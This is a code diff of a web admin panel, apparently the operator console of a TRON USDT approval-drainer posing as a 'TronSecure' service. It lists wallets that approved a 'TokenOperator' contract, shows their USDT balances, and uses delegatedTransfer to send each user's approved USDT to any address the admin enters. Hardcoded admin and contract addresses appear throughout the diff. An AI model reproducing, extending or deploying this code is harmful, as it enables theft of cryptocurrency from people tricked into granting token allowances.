@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin - USDT Approvals</title>
+    <title>Admin Panel - TronSecure</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         * {
             margin: 0;
@@ -25,10 +25,8 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            position: fixed;
+            position: sticky;
             top: 0;
-            left: 0;
-            right: 0;
             z-index: 100;
         }
 
@@ -42,38 +40,32 @@
 
         .container {
             max-width: 1400px;
-            margin: 80px auto 2rem;
+            margin: 2rem auto;
             padding: 0 2rem;
         }
 
+        /* Contract Info */
         .contract-info {
-            background: white;
+            background: linear-gradient(135deg, #667eea10 0%, #764ba210 100%);
+            border: 1px solid #667eea30;
             border-radius: 16px;
             padding: 20px;
             margin-bottom: 20px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
 
-        .contract-info h3 {
-            margin-bottom: 10px;
-            color: #333;
-        }
-
-        .contract-address-box {
-            background: #f0f3ff;
-            padding: 15px;
-            border-radius: 12px;
+        .contract-address {
             font-family: monospace;
+            font-size: 16px;
             color: #667eea;
-            font-weight: 600;
             word-break: break-all;
         }
 
+        /* Wallet Section */
         .wallet-section {
             background: white;
             border-radius: 16px;
             padding: 20px;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
 
@@ -83,14 +75,6 @@
             align-items: center;
             flex-wrap: wrap;
             gap: 15px;
-        }
-
-        .owner-badge {
-            background: #f59e0b;
-            color: white;
-            padding: 4px 12px;
-            border-radius: 50px;
-            font-size: 12px;
         }
 
         .btn {
@@ -107,6 +91,11 @@
             color: white;
         }
 
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
+        }
+
         .btn-success {
             background: #10b981;
             color: white;
@@ -117,6 +106,16 @@
             color: white;
         }
 
+        .owner-badge {
+            background: #f59e0b;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* Stats Grid */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -143,6 +142,7 @@
             color: #333;
         }
 
+        /* Filter Bar */
         .filter-bar {
             display: flex;
             gap: 15px;
@@ -159,6 +159,7 @@
             flex: 1;
         }
 
+        /* Table */
         .table-container {
             background: white;
             border-radius: 16px;
@@ -227,6 +228,7 @@
             color: white;
         }
 
+        /* Modal */
         .modal {
             display: none;
             position: fixed;
@@ -246,6 +248,8 @@
             padding: 30px;
             max-width: 500px;
             width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
         }
 
         .modal-header {
@@ -271,7 +275,6 @@
             display: block;
             margin-bottom: 8px;
             font-weight: 600;
-            color: #333;
         }
 
         .form-group input {
@@ -279,6 +282,7 @@
             padding: 12px;
             border: 2px solid #e0e0e0;
             border-radius: 8px;
+            font-size: 14px;
         }
 
         .user-info {
@@ -286,11 +290,11 @@
             padding: 15px;
             border-radius: 8px;
             margin-bottom: 20px;
+            line-height: 1.6;
         }
 
-        .user-info p {
-            margin: 5px 0;
-            color: #666;
+        .user-info strong {
+            color: #667eea;
         }
 
         .success-message {
@@ -324,52 +328,60 @@
             100% { transform: rotate(360deg); }
         }
 
-        .tx-link {
-            color: #667eea;
-            text-decoration: none;
-            font-size: 12px;
+        .refresh-btn {
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-left: 10px;
         }
 
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            color: #666;
-            font-size: 12px;
+        .refresh-btn:hover {
+            background: #e0e0e0;
         }
     </style>
 </head>
 <body>
     <div class="navbar">
-        <div class="logo">USDT Approval Admin</div>
+        <div class="logo">TronSecure Admin Panel</div>
         <div>
-            <span id="networkDisplay">🌐 Mainnet • USDT Only</span>
+            <span id="networkDisplay">🌐 TRON Mainnet</span>
+            <button class="refresh-btn" onclick="loadApprovals()">🔄 Refresh</button>
         </div>
     </div>
 
     <div class="container">
-        <!-- Contract Info (Fixed) -->
+        <!-- Contract Info -->
         <div class="contract-info">
-            <h3>📋 TokenOperator Contract</h3>
-            <div class="contract-address-box">
-                TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt
-            </div>
-            <div style="margin-top: 10px; color: #666; font-size: 12px;">
-                USDT Address: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <div>
+                    <strong>TokenOperator Contract:</strong>
+                    <div class="contract-address">TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt</div>
+                </div>
+                <div>
+                    <strong>USDT Contract:</strong>
+                    <div class="contract-address">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</div>
+                </div>
             </div>
         </div>
 
-        <!-- Wallet Connection -->
+        <!-- Admin Wallet Section -->
         <div class="wallet-section">
             <div class="wallet-info">
                 <div>
-                    <strong>Wallet:</strong> 
+                    <strong>Admin Wallet:</strong> 
                     <span id="walletStatus">Not connected</span>
                 </div>
-                <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
-                    Connect Owner Wallet
+                <div>
+                    <strong>Admin Address:</strong>
+                    <span id="adminAddress">TLtk7LwG56nCJBv8V6tb4KoyFrZutCtFAP</span>
+                </div>
+                <button id="connectBtn" class="btn btn-primary" onclick="connectAdmin()">
+                    Connect Admin Wallet
                 </button>
             </div>
-            <div id="walletDetails" style="margin-top: 15px;"></div>
+            <div id="ownerStatus" style="margin-top: 15px;"></div>
         </div>
 
         <!-- Stats -->
@@ -383,7 +395,7 @@
                 <div class="number" id="totalUsers">0</div>
             </div>
             <div class="stat-card">
-                <h3>Total USDT Approved</h3>
+                <h3>Total Volume (USDT)</h3>
                 <div class="number" id="totalVolume">0</div>
             </div>
             <div class="stat-card">
@@ -392,15 +404,14 @@
             </div>
         </div>
 
-        <!-- Filters -->
+        <!-- Filter Bar -->
         <div class="filter-bar">
-            <input type="text" id="searchUser" placeholder="🔍 Search by user address..." onkeyup="filterApprovals()">
+            <input type="text" id="searchInput" placeholder="🔍 Search by user address..." onkeyup="filterApprovals()">
             <select id="statusFilter" onchange="filterApprovals()">
                 <option value="all">All Approvals</option>
-                <option value="active">Active</option>
-                <option value="used">Used</option>
+                <option value="active">Active Only</option>
+                <option value="used">Used Only</option>
             </select>
-            <button class="btn btn-primary" onclick="loadApprovals()">🔄 Refresh</button>
         </div>
 
         <!-- Approvals Table -->
@@ -409,26 +420,22 @@
                 <thead>
                     <tr>
                         <th>User Address</th>
-                        <th>Token</th>
-                        <th>Approved USDT</th>
-                        <th>USDT Balance</th>
+                        <th>Amount (USDT)</th>
                         <th>Status</th>
                         <th>Time</th>
+                        <th>Transaction</th>
+                        <th>Balance</th>
                         <th>Actions</th>
                     </tr>
                 </thead>
                 <tbody id="approvalsTable">
                     <tr>
                         <td colspan="7" style="text-align: center; padding: 40px;">
-                            No USDT approvals yet. Users will appear here when they approve.
+                            Connect admin wallet to view approvals
                         </td>
                     </tr>
                 </tbody>
             </table>
-        </div>
-
-        <div class="footer">
-            TokenOperator • USDT Only • Contract: TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt
         </div>
     </div>
 
@@ -437,321 +444,297 @@
         <div class="modal-content">
             <div class="modal-header">
                 <h3>Transfer USDT</h3>
-                <button class="close-btn" onclick="closeTransferModal()">&times;</button>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
             </div>
-
-            <div id="transferUserInfo" class="user-info">
-                <p><strong>User:</strong> <span id="modalUser"></span></p>
-                <p><strong>Approved USDT:</strong> <span id="modalApproved"></span> USDT</p>
-                <p><strong>USDT Balance:</strong> <span id="modalBalance"></span> USDT</p>
-            </div>
-
+            <div id="userInfo" class="user-info"></div>
             <div class="form-group">
                 <label>To Address</label>
-                <input type="text" id="modalToAddress" placeholder="Enter recipient address">
+                <input type="text" id="toAddress" placeholder="Enter recipient address">
             </div>
-
             <div class="form-group">
                 <label>Amount (USDT)</label>
-                <input type="number" id="modalAmount" placeholder="Enter amount">
+                <input type="number" id="transferAmount" placeholder="Enter amount">
             </div>
-
             <button class="btn btn-success" onclick="executeTransfer()" id="transferBtn" style="width: 100%;">
                 Transfer USDT
             </button>
-
-            <div id="transferResult"></div>
+            <div id="transferStatus" style="margin-top: 15px;"></div>
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     <script>
         // ============================================
-        // CONFIGURATION - ONLY USDT
+        // CONFIGURATION
         // ============================================
-        
+        const ADMIN_WALLET = "TLtk7LwG56nCJBv8V6tb4KoyFrZutCtFAP";
         const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
         const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const NETWORK = "https://api.trongrid.io";
 
-        // Contract ABI
-        const CONTRACT_ABI = [
-            {
-                "constant": false,
-                "inputs": [
-                    {"name": "tokenAddress", "type": "address"},
-                    {"name": "from", "type": "address"},
-                    {"name": "to", "type": "address"},
-                    {"name": "amount", "type": "uint256"}
-                ],
-                "name": "delegatedTransfer",
-                "outputs": [{"name": "", "type": "bool"}],
-                "type": "function"
-            },
-            {
-                "constant": true,
-                "inputs": [
-                    {"name": "tokenAddress", "type": "address"},
-                    {"name": "account", "type": "address"}
-                ],
-                "name": "balanceOfToken",
-                "outputs": [{"name": "", "type": "uint256"}],
-                "type": "function"
-            },
-            {
-                "constant": true,
-                "inputs": [],
-                "name": "owner",
-                "outputs": [{"name": "", "type": "address"}],
-                "type": "function"
-            }
-        ];
-
-        // State
         let tronWeb = null;
-        let contract = null;
-        let adminAddress = null;
-        let contractOwner = null;
-        let approvals = [];
+        let usdtContract = null;
+        let tokenOperator = null;
         let currentUser = null;
-        let currentApprovedAmount = null;
+        let currentAmount = null;
+        let currentTxHash = null;
+        let allApprovals = [];
 
-        // Load approvals from localStorage
-        function loadApprovals() {
-            const saved = localStorage.getItem('usdtApprovals');
-            if (saved) {
-                approvals = JSON.parse(saved);
+        // ============================================
+        // CONNECT ADMIN WALLET
+        // ============================================
+        async function connectAdmin() {
+            if (!window.tronLink) {
+                alert('Please install TronLink wallet');
+                return;
             }
-            updateStats();
+
+            try {
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                
+                tronWeb = window.tronWeb;
+                const address = tronWeb.defaultAddress.base58;
+                
+                if (address === ADMIN_WALLET) {
+                    document.getElementById('walletStatus').innerHTML = '✅ Connected';
+                    document.getElementById('ownerStatus').innerHTML = 
+                        '<span class="owner-badge">✓ Admin Verified</span>';
+                    
+                    // Initialize contracts
+                    usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
+                    
+                    // Load approvals
+                    loadApprovals();
+                    
+                    // Auto refresh every 30 seconds
+                    setInterval(loadApprovals, 30000);
+                    
+                } else {
+                    document.getElementById('ownerStatus').innerHTML = 
+                        '<span style="color: #dc3545;">❌ Not admin wallet</span>';
+                }
+                
+            } catch(error) {
+                alert('Error: ' + error.message);
+            }
+        }
+
+        // ============================================
+        // LOAD APPROVALS FROM LOCALSTORAGE
+        // ============================================
+        function loadApprovals() {
+            const approvals = JSON.parse(localStorage.getItem('approvals') || '[]');
+            allApprovals = approvals;
+            
+            updateStats(approvals);
             displayApprovals(approvals);
         }
 
-        // Update stats
-        function updateStats() {
+        // ============================================
+        // UPDATE STATS
+        // ============================================
+        function updateStats(approvals) {
             document.getElementById('totalApprovals').innerText = approvals.length;
             
             const uniqueUsers = new Set(approvals.map(a => a.user));
             document.getElementById('totalUsers').innerText = uniqueUsers.size;
             
-            const totalVolume = approvals.reduce((sum, a) => sum + parseFloat(a.amount || 0), 0);
+            const totalVolume = approvals.reduce((sum, a) => sum + (a.amount || 0), 0);
             document.getElementById('totalVolume').innerText = totalVolume.toLocaleString();
             
-            const activeCount = approvals.filter(a => a.status === 'active').length;
-            document.getElementById('activeApprovals').innerText = activeCount;
+            const active = approvals.filter(a => a.status === 'active').length;
+            document.getElementById('activeApprovals').innerText = active;
         }
 
-        // Display approvals
-        function displayApprovals(approvalsList) {
+        // ============================================
+        // DISPLAY APPROVALS IN TABLE
+        // ============================================
+        function displayApprovals(approvals) {
             let html = '';
             
-            for (let app of approvalsList) {
+            approvals.forEach(app => {
                 html += `
                     <tr>
                         <td>${shortenAddress(app.user)}</td>
-                        <td>USDT</td>
-                        <td>${app.amount} USDT</td>
+                        <td>${app.amount.toLocaleString()} USDT</td>
+                        <td><span class="status-badge status-${app.status}">${app.status}</span></td>
+                        <td>${new Date(app.time).toLocaleString()}</td>
+                        <td><a href="https://tronscan.org/#/transaction/${app.txHash}" target="_blank">View Tx</a></td>
                         <td>
                             <button class="action-btn balance-btn" onclick="checkBalance('${app.user}')">
                                 Check Balance
                             </button>
                         </td>
-                        <td><span class="status-badge status-${app.status}">${app.status}</span></td>
-                        <td>${new Date(app.time).toLocaleString()}</td>
                         <td>
-                            <button class="action-btn transfer-btn" onclick="openTransferModal('${app.user}', '${app.amount}')">
-                                Transfer USDT
-                            </button>
+                            ${app.status === 'active' ? 
+                                `<button class="action-btn transfer-btn" onclick="openTransferModal('${app.user}', ${app.amount}, '${app.txHash}')">
+                                    Transfer
+                                </button>` : 
+                                'Used'}
                         </td>
                     </tr>
                 `;
-            }
+            });
             
             document.getElementById('approvalsTable').innerHTML = html || 
-                '<tr><td colspan="7" style="text-align: center; padding: 40px;">No USDT approvals found</td></tr>';
+                '<tr><td colspan="7" style="text-align: center; padding: 40px;">No approvals found</td></tr>';
         }
 
-        // Filter approvals
-        window.filterApprovals = function() {
-            const searchTerm = document.getElementById('searchUser').value.toLowerCase();
+        // ============================================
+        // FILTER APPROVALS
+        // ============================================
+        function filterApprovals() {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
             const statusFilter = document.getElementById('statusFilter').value;
             
-            const filtered = approvals.filter(app => {
+            const filtered = allApprovals.filter(app => {
                 const matchesSearch = app.user.toLowerCase().includes(searchTerm);
                 const matchesStatus = statusFilter === 'all' || app.status === statusFilter;
                 return matchesSearch && matchesStatus;
             });
             
             displayApprovals(filtered);
-        };
-
-        // Connect wallet
-        window.connectWallet = async function() {
-            const connectBtn = document.getElementById('connectBtn');
-            connectBtn.disabled = true;
-            connectBtn.innerHTML = '<span class="loading"></span> Connecting...';
-
-            try {
-                if (!window.tronLink) {
-                    throw new Error('TronLink not installed');
-                }
-
-                await window.tronLink.request({ method: 'tron_requestAccounts' });
-                
-                tronWeb = new TronWeb({
-                    fullHost: NETWORK,
-                    privateKey: window.tronLink.privateKey
-                });
-
-                adminAddress = tronWeb.defaultAddress.base58;
-                
-                // Initialize contract
-                contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
-                contractOwner = await contract.owner().call();
-
-                // Update UI
-                document.getElementById('walletStatus').innerHTML = '✅ Connected';
-                
-                let walletHtml = `<div><strong>Address:</strong> ${shortenAddress(adminAddress)}`;
-                if (adminAddress.toLowerCase() === contractOwner.toLowerCase()) {
-                    walletHtml += ` <span class="owner-badge">✓ Owner Verified</span>`;
-                } else {
-                    walletHtml += ` <span style="color: #ef4444;">(Not owner - transfers disabled)</span>`;
-                }
-                walletHtml += `</div>`;
-                document.getElementById('walletDetails').innerHTML = walletHtml;
-
-                if (adminAddress.toLowerCase() === contractOwner.toLowerCase()) {
-                    loadApprovals();
-                }
-
-            } catch (error) {
-                alert('Error: ' + error.message);
-            } finally {
-                connectBtn.disabled = false;
-                connectBtn.innerHTML = 'Connect Owner Wallet';
-            }
-        };
-
-        // Check user balance
-        window.checkBalance = async function(userAddress) {
-            if (!contract) {
-                alert('Please connect wallet first');
-                return;
-            }
-
-            try {
-                const balance = await contract.balanceOfToken(USDT_ADDRESS, userAddress).call();
-                const humanReadable = (balance / 1000000).toFixed(2);
-                alert(`💰 USDT Balance: ${humanReadable} USDT`);
-            } catch (error) {
-                alert('Error checking balance: ' + error.message);
-            }
-        };
-
-        // Open transfer modal
-        window.openTransferModal = function(userAddress, approvedAmount) {
-            if (!contract || adminAddress.toLowerCase() !== contractOwner.toLowerCase()) {
-                alert('Only contract owner can transfer');
-                return;
-            }
-
-            currentUser = userAddress;
-            currentApprovedAmount = approvedAmount;
-            
-            document.getElementById('modalUser').innerText = shortenAddress(userAddress);
-            document.getElementById('modalApproved').innerText = approvedAmount;
-            
-            // Get current balance
-            contract.balanceOfToken(USDT_ADDRESS, userAddress).call().then(balance => {
-                document.getElementById('modalBalance').innerText = (balance / 1000000).toFixed(2);
-            }).catch(() => {
-                document.getElementById('modalBalance').innerText = '?';
-            });
-            
-            document.getElementById('transferModal').style.display = 'flex';
-        };
-
-        // Close transfer modal
-        window.closeTransferModal = function() {
-            document.getElementById('transferModal').style.display = 'none';
-            document.getElementById('modalToAddress').value = '';
-            document.getElementById('modalAmount').value = '';
-            document.getElementById('transferResult').innerHTML = '';
-        };
-
-        // Execute transfer
-        window.executeTransfer = async function() {
-            const toAddress = document.getElementById('modalToAddress').value;
-            const amount = document.getElementById('modalAmount').value;
-
-            if (!toAddress || !amount) {
-                showTransferResult('Please fill all fields', 'error');
-                return;
-            }
-
-            if (parseFloat(amount) > parseFloat(currentApprovedAmount)) {
-                showTransferResult('Amount exceeds approved amount', 'error');
-                return;
-            }
-
-            const transferBtn = document.getElementById('transferBtn');
-            transferBtn.disabled = true;
-            transferBtn.innerHTML = '<span class="loading"></span> Transferring...';
-
-            try {
-                const amountInSun = Math.floor(amount * 1000000);
-                
-                const result = await contract.delegatedTransfer(
-                    USDT_ADDRESS,
-                    currentUser,
-                    toAddress,
-                    amountInSun
-                ).send();
-
-                showTransferResult(`✅ Transfer successful! TX: ${shortenAddress(result)}`, 'success');
-
-                // Update approval status
-                approvals = approvals.map(a => {
-                    if (a.user === currentUser && a.status === 'active') {
-                        return {...a, status: 'used'};
-                    }
-                    return a;
-                });
-                localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
-                
-                setTimeout(() => {
-                    closeTransferModal();
-                    loadApprovals();
-                }, 2000);
-
-            } catch (error) {
-                showTransferResult('❌ Error: ' + error.message, 'error');
-            } finally {
-                transferBtn.disabled = false;
-                transferBtn.innerHTML = 'Transfer USDT';
-            }
-        };
-
-        function showTransferResult(message, type) {
-            const resultDiv = document.getElementById('transferResult');
-            resultDiv.innerHTML = `<div class="${type}-message">${message}</div>`;
         }
 
+        // ============================================
+        // CHECK USER BALANCE
+        // ============================================
+        async function checkBalance(userAddress) {
+            if (!usdtContract) {
+                alert('Please connect admin wallet first');
+                return;
+            }
+
+            try {
+                const balance = await usdtContract.balanceOf(userAddress).call();
+                const usdtBalance = (balance / 1000000).toFixed(2);
+                alert(`💰 USDT Balance: ${usdtBalance} USDT`);
+            } catch(error) {
+                alert('Error checking balance: ' + error.message);
+            }
+        }
+
+        // ============================================
+        // OPEN TRANSFER MODAL
+        // ============================================
+        function openTransferModal(user, amount, txHash) {
+            currentUser = user;
+            currentAmount = amount;
+            currentTxHash = txHash;
+            
+            document.getElementById('userInfo').innerHTML = `
+                <strong>User Address:</strong> ${user}<br>
+                <strong>Approved Amount:</strong> ${amount.toLocaleString()} USDT<br>
+                <strong>Transaction:</strong> <a href="https://tronscan.org/#/transaction/${txHash}" target="_blank">View on Tronscan</a>
+            `;
+            
+            document.getElementById('transferModal').style.display = 'flex';
+        }
+
+        // ============================================
+        // CLOSE MODAL
+        // ============================================
+        function closeModal() {
+            document.getElementById('transferModal').style.display = 'none';
+            document.getElementById('toAddress').value = '';
+            document.getElementById('transferAmount').value = '';
+            document.getElementById('transferStatus').innerHTML = '';
+        }
+
+        // ============================================
+        // EXECUTE TRANSFER
+        // ============================================
+        async function executeTransfer() {
+            const to = document.getElementById('toAddress').value;
+            const amount = document.getElementById('transferAmount').value;
+            
+            if (!to || !amount) {
+                document.getElementById('transferStatus').innerHTML = 
+                    '<div class="error-message">Please fill all fields</div>';
+                return;
+            }
+
+            if (amount > currentAmount) {
+                document.getElementById('transferStatus').innerHTML = 
+                    '<div class="error-message">Amount exceeds approved amount</div>';
+                return;
+            }
+
+            const btn = document.getElementById('transferBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> Transferring...';
+
+            try {
+                // Initialize TokenOperator contract
+                const tokenOperator = await tronWeb.contract().at(CONTRACT_ADDRESS);
+                
+                const amountInSun = amount * 1000000;
+                
+                // Call delegatedTransfer
+                const result = await tokenOperator.delegatedTransfer(
+                    USDT_ADDRESS,
+                    currentUser,
+                    to,
+                    amountInSun
+                ).send();
+                
+                document.getElementById('transferStatus').innerHTML = 
+                    `<div class="success-message">✅ Transfer successful!<br>TX: ${shortenAddress(result)}</div>`;
+                
+                // Update approval status
+                updateApprovalStatus(currentUser, currentAmount, amount);
+                
+                setTimeout(() => {
+                    closeModal();
+                    loadApprovals();
+                }, 3000);
+                
+            } catch(error) {
+                document.getElementById('transferStatus').innerHTML = 
+                    `<div class="error-message">❌ Error: ${error.message}</div>`;
+                btn.disabled = false;
+                btn.innerHTML = 'Transfer USDT';
+            }
+        }
+
+        // ============================================
+        // UPDATE APPROVAL STATUS
+        // ============================================
+        function updateApprovalStatus(user, totalAmount, transferredAmount) {
+            const approvals = JSON.parse(localStorage.getItem('approvals') || '[]');
+            
+            const updated = approvals.map(a => {
+                if (a.user === user && a.amount === totalAmount && a.status === 'active') {
+                    if (transferredAmount >= totalAmount) {
+                        return {...a, status: 'used'};
+                    }
+                }
+                return a;
+            });
+            
+            localStorage.setItem('approvals', JSON.stringify(updated));
+        }
+
+        // ============================================
+        // SHORTEN ADDRESS
+        // ============================================
         function shortenAddress(addr) {
-            if (!addr || addr.length < 10) return addr;
+            if (!addr) return '';
+            if (addr.length < 10) return addr;
             return addr.slice(0, 6) + '...' + addr.slice(-4);
         }
 
-        // Initialize
+        // ============================================
+        // LOAD ON PAGE LOAD
+        // ============================================
         window.onload = function() {
             loadApprovals();
-        };
-
-        // Close modal on outside click
-        window.onclick = function(event) {
-            const modal = document.getElementById('transferModal');
-            if (event.target == modal) {
-                modal.style.display = 'none';
+            
+            // Check if admin wallet already connected
+            if (window.tronWeb && window.tronWeb.ready) {
+                const address = window.tronWeb.defaultAddress.base58;
+                if (address === ADMIN_WALLET) {
+                    document.getElementById('walletStatus').innerHTML = '✅ Connected';
+                    tronWeb = window.tronWeb;
+                }
             }
         };
     </script>
